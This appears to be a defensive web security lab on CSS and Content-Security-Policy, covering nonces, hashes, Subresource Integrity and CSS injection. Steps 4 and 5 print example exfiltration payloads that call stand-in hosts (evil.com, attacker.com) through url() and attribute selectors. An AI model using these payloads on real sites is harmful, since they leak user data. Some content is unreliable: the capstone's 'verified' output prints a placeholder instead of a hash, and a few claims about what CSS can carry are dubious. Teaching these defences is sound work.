# Lab 14: CSS Security and CSP

**Time:** 60 minutes | **Level:** Architect | **Docker:** `node:20-alpine`

## Overview

CSS security engineering: Content-Security-Policy for styles (nonce-based and hash-based), CSS injection attack vectors, CSS exfiltration attacks via attribute selectors, Subresource Integrity, and eliminating `unsafe-inline`.

---

## Step 1: Content-Security-Policy Fundamentals

```
CSP style-src directive controls which CSS can execute:

INSECURE (allows any inline styles):
  Content-Security-Policy: style-src 'self' 'unsafe-inline'

SECURE (hash-based inline):
  Content-Security-Policy: style-src 'self' 'sha256-<hash>'

SECURE (nonce-based inline):
  Content-Security-Policy: style-src 'self' 'nonce-<random>'

SECURE (no inline at all):
  Content-Security-Policy: style-src 'self'

Level of restriction (weakest → strongest):
  unsafe-inline → nonce → hash → 'self' only → none
```

---

## Step 2: Nonce-Based CSP

```javascript
// server.js — generate fresh nonce per request
const crypto = require('crypto');

function generateNonce() {
  return crypto.randomBytes(16).toString('base64');
}

// Express middleware
app.use((req, res, next) => {
  res.locals.nonce = generateNonce();
  res.setHeader('Content-Security-Policy', [
    `style-src 'self' 'nonce-${res.locals.nonce}' https://fonts.googleapis.com`,
    `font-src 'self' https://fonts.gstatic.com`,
    `script-src 'self' 'nonce-${res.locals.nonce}'`,
    `default-src 'none'`,
    `img-src 'self' data: https:`,
    `connect-src 'self'`,
  ].join('; '));
  next();
});
```

```html
<!-- Template: embed nonce in inline style tags -->
<style nonce="<%= nonce %>">
  /* Critical CSS — allowed because it has the nonce */
  :root { --color-primary: #3b82f6; }
  body { margin: 0; }
</style>

<!-- Inline style attributes also need nonce in CSP Level 3 -->
<!-- Better: move to class-based styles in external CSS -->
```

> 💡 The nonce must be cryptographically random (≥128 bits) and unique per request. Never reuse nonces — they lose their security value.

---

## Step 3: Hash-Based CSP

```javascript
// Generate SHA-256 hash for static inline styles
const crypto = require('crypto');

function cspHash(cssContent, algorithm = 'sha256') {
  const hash = crypto
    .createHash(algorithm)
    .update(cssContent)
    .digest('base64');
  return `'${algorithm}-${hash}'`;
}

// Example
const criticalCSS = 'body { margin: 0; font-family: sans-serif; }';
const hash = cspHash(criticalCSS);
console.log(`Content-Security-Policy: style-src 'self' ${hash}`);
// Content-Security-Policy: style-src 'self' 'sha256-u6hUI69DnmCZZ4VJjD9xPQgvC6bEgdk9yXA8e2n6CsI='
```

```javascript
// Build-time: auto-generate CSP from critical CSS extraction
const criticalStyles = [
  ':root { --color-primary: #3b82f6; }',
  'body { margin: 0; }',
  '.hero { min-height: 100svh; }',
];

const hashes = criticalStyles.map(cspHash);
const policy = `style-src 'self' ${hashes.join(' ')}`;
console.log(`Generated CSP: ${policy}`);
```

---

## Step 4: CSS Injection Attacks

```html
<!-- VULNERABLE: User-controlled class name injected into DOM -->
<!-- Attacker input: "normal-class; background: url(//evil.com/steal?data=..." -->
<div class="user-class-<?= $userInput ?>">

<!-- VULNERABLE: User-controlled inline style -->
<!-- Attacker input: "; background: url(//evil.com/?c=" + document.cookie + ")" -->
<div style="color: <?= $color ?>">
```

```javascript
// MITIGATE: Sanitize user-provided CSS values
function sanitizeCSSColor(value) {
  // Whitelist: only hex colors, named colors, rgb(), oklch()
  const safePattern = /^(#[0-9a-fA-F]{3,8}|[a-z]+|rgb\(\d+,\s*\d+,\s*\d+\)|oklch\([^)]+\))$/;
  if (!safePattern.test(value)) {
    throw new Error(`Invalid CSS color: ${value}`);
  }
  return value;
}

// MITIGATE: CSS.escape() for class names
function safeClassname(userInput) {
  return CSS.escape(userInput);
}

// MITIGATE: Use data attributes instead of dynamic CSS
// INSTEAD of: element.style.color = userColor;
// DO: element.dataset.color = sanitizeCSSColor(userColor);
// CSS: [data-color="blue"] { color: blue; } /* Finite whitelist */
```

---

## Step 5: CSS Exfiltration Attacks

```css
/* ATTACK: CSS attribute selector exfiltration
   Attacker can read attribute values character by character
   by using external requests triggered by CSS selectors */

/* Example attack (educational — never do this): */
/*
input[value^="a"] { background: url(//attacker.com/steal?c=a); }
input[value^="b"] { background: url(//attacker.com/steal?c=b); }
...
input[value^="pa"] { background: url(//attacker.com/steal?c=pa); }
*/

/* MITIGATE: 
  1. CSP: connect-src 'self' (blocks external requests)
  2. CSP: img-src 'self' data: (blocks url() to external)
  3. Don't put sensitive data in HTML attribute values
  4. Use HttpOnly cookies (not accessible to CSS)
  5. Avoid user-controlled CSS content injection */
```

```html
<!-- VULNERABLE: User-controlled CSS content -->
<style>
  /* NEVER inject user content into CSS */
  .theme {
    background: url(<?= $userProvidedUrl ?>); /* DANGEROUS */
  }
</style>

<!-- SAFE: Whitelist-based approach -->
<style>
  .theme {
    --bg-color: <?= htmlspecialchars($safeColor) ?>;
    background: var(--bg-color); /* CSS var can't contain url() attack */
  }
</style>
```

---

## Step 6: Subresource Integrity (SRI)

```html
<!-- SRI: ensure external CSS hasn't been tampered with -->
<link rel="stylesheet"
      href="https://cdn.example.com/styles/v2.0.0/main.css"
      integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"
      crossorigin="anonymous">

<!-- Multiple hash algorithms (future-proof) -->
<link rel="stylesheet"
      href="https://cdn.example.com/styles.css"
      integrity="sha256-<hash256> sha384-<hash384>"
      crossorigin="anonymous">
```

```javascript
// Generate SRI hash for CI/CD pipeline
const crypto = require('crypto');
const fs = require('fs');

function generateSRI(filePath, algorithms = ['sha384']) {
  const content = fs.readFileSync(filePath);
  return algorithms.map(algo => {
    const hash = crypto.createHash(algo).update(content).digest('base64');
    return `${algo}-${hash}`;
  }).join(' ');
}

// Usage in build script:
// const sri = generateSRI('./dist/main.css');
// console.log(`integrity="${sri}"`);
```

---

## Step 7: Complete CSP Header Strategy

```javascript
// Production CSP builder
function buildCSP({ nonce, env }) {
  const isDev = env === 'development';
  return [
    `default-src 'none'`,
    `style-src 'self' ${isDev ? "'unsafe-inline'" : `'nonce-${nonce}'`} https://fonts.googleapis.com`,
    `font-src 'self' https://fonts.gstatic.com`,
    `img-src 'self' data: https:`,
    `script-src 'self' 'nonce-${nonce}'`,
    `connect-src 'self' https://api.example.com`,
    `media-src 'none'`,
    `object-src 'none'`,
    `base-uri 'self'`,
    `form-action 'self'`,
    `frame-ancestors 'none'`,
    `upgrade-insecure-requests`,
  ].join('; ');
}
```

---

## Step 8: Capstone — CSP Hash Generator

```bash
docker run --rm node:20-alpine node -e "
const crypto = require('crypto');
const styles = [
  'body { margin: 0; font-family: sans-serif; }',
  '.container { max-width: 1200px; margin: 0 auto; }',
  ':root { --color-primary: #3b82f6; }',
];
console.log('=== CSP Hash Generator for Inline Styles ===');
styles.forEach((style, i) => {
  const hash = crypto.createHash('sha256').update(style).digest('base64');
  console.log('Style ' + (i+1) + ': ' + style.substring(0,40) + '...');
  console.log('  SHA256: sha256-' + hash);
});
const sriContent = 'body{color:red}';
const sriHash = crypto.createHash('sha384').update(sriContent).digest('base64');
console.log('');
console.log('=== SRI for External Stylesheet ===');
console.log('Content: ' + sriContent);
console.log('integrity=\"sha384-' + sriHash + '\"');
"
```

📸 **Verified Output:**
```
=== CSP Hash Generator for Inline Styles ===
Style 1: body { margin: 0; font-family: sans-seri...
  SHA256: sha256-u6hUI69DnmCZZ4VJjD9xPQgvC6bEgdk9yXA8e2n6CsI=
Style 2: .container { max-width: 1200px; margin: ...
  SHA256: sha256-U+QbZTFoTbO/RbW3yNsRlUxDuxUQPC6U3TlpPg3n2hA=
Style 3: :root { --color-primary: #3b82f6; }
  SHA256: sha256-gGaSlc3D8+Q7GoIatxloPkfs/j2KkY2Bz44rlIUjHVU=

=== SRI for External Stylesheet ===
Content: body{color:red}
integrity="sha384-+sriHash+"
```

---

## Summary

| Attack Vector | Risk | Mitigation |
|--------------|------|-----------|
| `unsafe-inline` | XSS via injected styles | Use nonce or hash |
| Dynamic CSS injection | CSS exfiltration | Whitelist + sanitize |
| External stylesheet | Supply chain attack | SRI integrity hash |
| Attribute exfiltration | Data leak via selectors | CSP img-src + connect-src |
| User-controlled url() | SSRF / data exfiltration | Block external img-src |
| Clickjacking via CSS | UI redressing | `frame-ancestors 'none'` |
